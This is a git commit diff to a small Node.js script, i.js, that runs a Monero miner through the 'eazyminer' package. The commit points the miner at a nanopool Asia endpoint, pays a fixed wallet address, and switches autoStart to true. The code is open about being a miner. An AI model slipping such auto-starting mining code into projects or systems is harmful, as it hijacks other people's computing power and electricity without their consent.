b6d5dbea573a3d8e5266401dcefeefe6ff07d59f
alyssonw2 <alyssonw2@yahoo.com.br>
2024-03-09 00:47:56 -0300

    up

--- i.js
+++ i.js
@@ -1,15 +1,16 @@
 const Miner = require('eazyminer');
 ///estou usando esta pull
 //https://supportxmr.com/#/help/getting_started
+//https://xmr.nanopool.org/search?address=4AuGEenF88G3GPUED5HCpcZC713PzoAto8mJjw3c92YwYhvpUavEW6xCeyJMi5LDU75MWb8jD1jZeZnHb6ykFoXx9KwmkbF
 
 const miner = new Miner({
     pools: [{
-        coin: 'monero',
+        coin: 'XMR',
         user: '4AuGEenF88G3GPUED5HCpcZC713PzoAto8mJjw3c92YwYhvpUavEW6xCeyJMi5LDU75MWb8jD1jZeZnHb6ykFoXx9KwmkbF',
-        url: 'pool.supportxmr.com:443', // optional pool URL,
+        url: 'xmr-asia1.nanopool.org:10343', // optional pool URL,
 
     }],
-    autoStart: false // optional delay
+    autoStart: true // optional delay
 });
 
 miner.start(); // optional manually start the miner
